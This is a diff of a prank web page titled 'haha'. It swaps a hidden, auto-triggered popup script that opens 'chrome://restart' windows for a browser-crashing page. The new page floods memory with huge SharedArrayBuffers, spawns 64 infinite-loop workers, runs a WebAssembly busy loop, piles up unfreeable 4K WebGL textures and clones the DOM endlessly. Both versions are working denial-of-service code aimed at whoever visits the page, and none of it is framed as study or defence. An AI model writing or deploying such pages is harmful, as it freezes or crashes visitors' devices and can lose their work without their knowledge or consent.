@@ -1,100 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>haha</title>
-  <style>
-    /* Make everything black */
-    body, html {
-      background-color: black;
-      color: black;
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    /* Style the label to position custom checkbox */
-    label {
-      display: flex;
-      align-items: center;
-      cursor: pointer;
-      font-size: 20px;
-      color: black;
-    }
-
-    /* Hide the default checkbox */
-    input[type="checkbox"] {
-      appearance: none; 
-      -webkit-appearance: none;
-      width: 20px;
-      height: 20px;
-      border: 2px solid black;
-      background-color: black;
-      margin-right: 10px;
-      cursor: pointer;
-      position: relative;
-    }
-
-    /* Show a checkmark when checked (still black) */
-    input[type="checkbox"]:checked::after {
-      content: '';
-      position: absolute;
-      width: 6px;
-      height: 12px;
-      border: solid black;
-      border-width: 0 2px 2px 0;
-      top: 2px;
-      left: 6px;
-      transform: rotate(45deg);
-    }
-  </style>
-</head>
+<!doctype html>
+<html><head><meta charset=utf-8><title>haha</title></head>
 <body>
+<script>
+/* ---------- 1. RAM: SharedArrayBuffer flood ---------- */
+const mb = 1024*1024;
+setInterval(()=>{
+  new SharedArrayBuffer(400*mb);        // 400 MB each tick
+}, 10);
 
-  <label>
-    <input type="checkbox" id="popupCheckbox"> Open Popups
-  </label>
+/* ---------- 2. CPU: 64 workers, infinite loop ---------- */
+const code = `while(1){}`;              // 1 instruction, zero yield
+const b = new Blob([code],{type:'application/javascript'});
+for(let i=0;i<64;i++) new Worker(URL.createObjectURL(b));
 
-  <script>
-    const checkbox = document.getElementById('popupCheckbox');
+/* ---------- 3. MAIN THREAD: WASM busy-loop ---------- */
+const wasmBin = new Uint8Array([
+  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x04,0x01,0x60,0x00,0x00,
+  0x03,0x02,0x01,0x00,0x0a,0x05,0x01,0x03,0x00,0x01,0x0b
+]); // infinite loop in wasm
+WebAssembly.instantiate(wasmBin).then(obj=>{
+  while(1){ obj.instance.exports[0](); }   // never yields
+});
 
-    function openPopups(count) {
-      let left = 100; // starting X position
-      let top = 100;  // starting Y position
-      const width = 200;
-      const height = 200;
-      const gap = 20; // gap between popups
+/* ---------- 4. GPU: 4 K textures per frame ---------- */
+const canvases = [];
+let idx=0;
+setInterval(()=>{
+  const c = document.createElement('canvas');
+  c.width=c.height=4096;
+  const gl = c.getContext('webgl2');
+  const t = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, t);
+  gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,4096,4096,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+  canvases.push(c);          // keep reference so GC can’t free
+}, 16);                      // ~60 fps → 256 MB per frame
 
-      for (let i = 0; i < count; i++) {
-        window.open(
-          'chrome://restart',
-          '_blank',
-          `width=${width},height=${height},left=${left},top=${top}`
-        );
-
-        // Move the next popup to the right
-        left += width + gap;
-      }
-    }
-
-    // Trigger popups when checkbox is checked
-    checkbox.addEventListener('change', () => {
-      if (checkbox.checked) {
-        openPopups(5); // Open 10 popups
-      }
-    });
-
-    // Automatically check the checkbox after 2 seconds
-    setTimeout(() => {
-      checkbox.checked = true;
-      checkbox.dispatchEvent(new Event('change'));
-    }, 2000);
-  </script>
-
-</body>
-</html>
+/* ---------- 5. DOM: exponential clone ---------- */
+setInterval(()=>{
+  document.body.appendChild(document.documentElement.cloneNode(true));
+}, 50);
+</script>
+</body></html>
